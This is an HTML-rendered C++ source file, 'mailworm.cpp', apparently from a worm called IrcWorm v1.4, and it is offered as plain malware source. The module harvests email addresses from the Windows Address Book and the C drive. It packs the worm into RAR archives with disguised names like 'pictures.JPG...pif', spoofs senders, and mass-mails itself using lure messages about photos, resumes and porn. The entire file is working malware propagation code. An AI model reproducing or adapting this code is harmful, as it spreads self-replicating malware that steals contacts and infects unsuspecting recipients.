<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>IrcWorm v1.4 (CPP Sources) - mailworm.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include "stdafx.h"
#include "prototypez.h"
#include "stdlib.h"
#include "winsock2.h"
#include "smtp_engine.h"
</span><span class="sc0">
</span><span class="sc1">/*mass mailer module */</span><span class="sc0">


</span><span class="sc9">#define MAX_MAILS       0x50
#define MAX_MAIL_SIZE   0x44
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">WAB</span><span class="sc10">[</span><span class="sc11">MAX_MAILS</span><span class="sc10">][</span><span class="sc11">MAX_MAIL_SIZE</span><span class="sc10">];</span><span class="sc0">      </span><span class="sc2">//windows address book mailist
</span><span class="sc16">short</span><span class="sc0">   </span><span class="sc11">nWABMails</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subjects</span><span class="sc10">[]={</span><span class="sc6">"Re"</span><span class="sc10">,</span><span class="sc6">"Resume"</span><span class="sc10">,</span><span class="sc6">"Your Files"</span><span class="sc10">,</span><span class="sc6">"Your Stuff"</span><span class="sc10">,</span><span class="sc6">"My Story"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">messages</span><span class="sc10">[]={</span><span class="sc6">"here are the pictures you asked me to send you."</span><span class="sc10">,</span><span class="sc0">
                  </span><span class="sc6">"please read again what i have written to you !"</span><span class="sc10">,</span><span class="sc0">
                  </span><span class="sc6">"here are the programms you asked me to mail you\nfor any help,mail me back"</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc6">"here are the porn screen saver you asked me to show you..."</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc6">"just read it,its fantastic"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">attachments</span><span class="sc10">[]={</span><span class="sc6">"pictures.rar"</span><span class="sc10">,</span><span class="sc6">"info.rar"</span><span class="sc10">,</span><span class="sc6">"package1.rar"</span><span class="sc10">,</span><span class="sc6">"porn.rar"</span><span class="sc10">,</span><span class="sc6">"My Life.rar"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">xAttachments</span><span class="sc10">[]={</span><span class="sc6">"pictures.JPG...pif"</span><span class="sc10">,</span><span class="sc6">"mail_READ.txt...scr"</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc6">"musicbox.MP3.pif"</span><span class="sc10">,</span><span class="sc6">"linda.scr"</span><span class="sc10">,</span><span class="sc6">"Story.scr"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">N_Attch</span><span class="sc10">=</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">nmsg</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#define MAX_MESSAGES 5
</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">GetWABMails</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hkey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">WABFile</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WF_size</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">WABFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WF_Type</span><span class="sc10">=</span><span class="sc11">REG_SZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc11">hmap</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">WABase</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\WAB\\WAB4\\Wab File Name"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">hkey</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">WF_Type</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">WABFile</span><span class="sc10">,&amp;</span><span class="sc11">WF_size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">WABFile</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">hmap</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hmap</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">WABase</span><span class="sc10">=</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">hmap</span><span class="sc10">,</span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">WABase</span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hmap</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">__asm</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0">     </span><span class="sc11">eax</span><span class="sc10">,[</span><span class="sc11">WABase</span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc11">eax</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">64h</span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc11">pop</span><span class="sc0">     </span><span class="sc10">[</span><span class="sc11">nWABMails</span><span class="sc10">]</span><span class="sc0">                     </span><span class="sc10">;</span><span class="sc11">get</span><span class="sc0"> </span><span class="sc11">number</span><span class="sc0"> </span><span class="sc11">of</span><span class="sc0"> </span><span class="sc11">mails</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nWABMails</span><span class="sc10">&lt;=</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">WABase</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hmap</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nWABMails</span><span class="sc10">&gt;</span><span class="sc11">MAX_MAILS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">nWABMails</span><span class="sc10">=</span><span class="sc11">MAX_MAILS</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">__asm</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0">     </span><span class="sc11">esi</span><span class="sc10">,[</span><span class="sc11">WABase</span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc11">movzx</span><span class="sc0">   </span><span class="sc11">ecx</span><span class="sc10">,[</span><span class="sc11">nWABMails</span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc11">add</span><span class="sc0">     </span><span class="sc11">esi</span><span class="sc10">,[</span><span class="sc11">esi</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">60h</span><span class="sc10">]</span><span class="sc0">                     </span><span class="sc10">;</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">start</span><span class="sc0"> </span><span class="sc11">of</span><span class="sc0"> </span><span class="sc11">mails</span><span class="sc0">
        </span><span class="sc11">lea</span><span class="sc0">     </span><span class="sc11">edi</span><span class="sc10">,</span><span class="sc11">WAB</span><span class="sc0">
</span><span class="sc11">NMail</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">ecx</span><span class="sc0">                                 </span><span class="sc10">;</span><span class="sc11">save</span><span class="sc0"> </span><span class="sc11">number</span><span class="sc0"> </span><span class="sc11">of</span><span class="sc0"> </span><span class="sc11">mails</span><span class="sc0">
        </span><span class="sc5">xor</span><span class="sc0">     </span><span class="sc11">ebx</span><span class="sc10">,</span><span class="sc11">ebx</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0">     </span><span class="sc11">ecx</span><span class="sc10">,</span><span class="sc11">MAX_MAIL_SIZE</span><span class="sc0">
</span><span class="sc11">NxtChar</span><span class="sc10">:</span><span class="sc11">lodsb</span><span class="sc0">                                       </span><span class="sc10">;</span><span class="sc11">read</span><span class="sc0"> </span><span class="sc11">one</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">
        </span><span class="sc11">inc</span><span class="sc0">     </span><span class="sc11">esi</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0">     </span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc11">edi</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ebx</span><span class="sc10">],</span><span class="sc11">al</span><span class="sc0">             </span><span class="sc10">;</span><span class="sc11">save</span><span class="sc0"> </span><span class="sc11">it</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc0">
        </span><span class="sc11">cmp</span><span class="sc0">     </span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc11">esi</span><span class="sc10">],</span><span class="sc4">0h</span><span class="sc0">
        </span><span class="sc11">je</span><span class="sc0">      </span><span class="sc11">MNextMail</span><span class="sc0">
        </span><span class="sc11">inc</span><span class="sc0">     </span><span class="sc11">ebx</span><span class="sc0">
        </span><span class="sc11">dec</span><span class="sc0">     </span><span class="sc11">ecx</span><span class="sc0">
        </span><span class="sc11">loop</span><span class="sc0">    </span><span class="sc11">NxtChar</span><span class="sc0">
</span><span class="sc11">MNextMail</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">sub</span><span class="sc0">     </span><span class="sc11">ecx</span><span class="sc10">,</span><span class="sc4">2h</span><span class="sc0">
        </span><span class="sc11">add</span><span class="sc0">     </span><span class="sc11">esi</span><span class="sc10">,</span><span class="sc11">ecx</span><span class="sc0">
        </span><span class="sc11">add</span><span class="sc0">     </span><span class="sc11">edi</span><span class="sc10">,</span><span class="sc11">MAX_MAIL_SIZE</span><span class="sc0">                   </span><span class="sc10">;</span><span class="sc11">move</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc0"> </span><span class="sc11">next</span><span class="sc0"> </span><span class="sc11">field</span><span class="sc0"> </span><span class="sc11">at</span><span class="sc0"> </span><span class="sc11">the</span><span class="sc0"> </span><span class="sc11">array</span><span class="sc0">
        </span><span class="sc11">pop</span><span class="sc0">     </span><span class="sc11">ecx</span><span class="sc0">     
        </span><span class="sc11">loop</span><span class="sc0">    </span><span class="sc11">NMail</span><span class="sc0">                               </span><span class="sc10">;</span><span class="sc11">move</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc0"> </span><span class="sc11">next</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">WABase</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hmap</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">mailworm</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">xvoid</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">smailworm</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Mailist</span><span class="sc0"> </span><span class="sc11">xMList</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MailInfoList</span><span class="sc0"> </span><span class="sc11">xMIL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HGLOBAL</span><span class="sc0"> </span><span class="sc11">wBase64</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">xAttach</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">WormPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rnd_str</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">worm_s</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">xMList</span><span class="sc10">.</span><span class="sc11">max_mails_to_send</span><span class="sc10">=</span><span class="sc11">MAX_MAILS</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">//set max of mails
</span><span class="sc0">    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetWABMails</span><span class="sc10">()==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">xMList</span><span class="sc10">.</span><span class="sc11">number_of_mails</span><span class="sc10">=</span><span class="sc11">nWABMails</span><span class="sc10">;</span><span class="sc0">   
        
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">nWABMails</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xMList</span><span class="sc10">.</span><span class="sc11">mail_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc11">WAB</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">        </span><span class="sc2">//copy wab mails into main list
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">InitMailSearch</span><span class="sc10">(</span><span class="sc6">"c:\\"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">//scan c drive for mails
</span><span class="sc0">
    </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">XThread</span><span class="sc10">(</span><span class="sc11">mail_search</span><span class="sc10">,&amp;</span><span class="sc11">xMList</span><span class="sc10">),</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">WormPath</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc11">xAttach</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RandomString</span><span class="sc10">(</span><span class="sc11">rnd_str</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">rnd_str</span><span class="sc10">),</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">xAttach</span><span class="sc10">,</span><span class="sc11">rnd_str</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">xAttach</span><span class="sc10">,</span><span class="sc6">".tmp"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">AddToRar</span><span class="sc10">(</span><span class="sc11">xAttach</span><span class="sc10">,</span><span class="sc11">WormPath</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">xAttachments</span><span class="sc10">[(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">N_Attch</span><span class="sc10">)],</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//make rar archive
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">base64_worm_encode</span><span class="sc10">(</span><span class="sc11">xAttach</span><span class="sc10">,</span><span class="sc11">wBase64</span><span class="sc10">,</span><span class="sc11">worm_s</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//base64 encode the worm
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">xAttach</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">xMIL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">xMIL</span><span class="sc10">));</span><span class="sc0">   </span><span class="sc2">//zero struct
</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">MAX_MESSAGES</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc2">//setup mail info list
</span><span class="sc0">            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xMIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">attachment</span><span class="sc10">,</span><span class="sc11">attachments</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xMIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc11">subjects</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xMIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">text</span><span class="sc10">,</span><span class="sc11">messages</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">xMIL</span><span class="sc10">.</span><span class="sc11">fake_mail_from</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//pick random mail from the mail list
</span><span class="sc0">            </span><span class="sc11">xMIL</span><span class="sc10">.</span><span class="sc11">number_of_MIL</span><span class="sc10">=</span><span class="sc11">MAX_MESSAGES</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">smailworm</span><span class="sc10">=</span><span class="sc11">FindSmtp_AndConnect</span><span class="sc10">();</span><span class="sc0">    </span><span class="sc2">//connect to smtp server
</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">smailworm</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">SendMails</span><span class="sc10">(</span><span class="sc11">smailworm</span><span class="sc10">,</span><span class="sc11">xMList</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">wBase64</span><span class="sc10">,</span><span class="sc11">worm_s</span><span class="sc10">,</span><span class="sc11">xMIL</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc11">Base64_free_image</span><span class="sc10">(</span><span class="sc11">wBase64</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//free base64 encoded worm memory
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
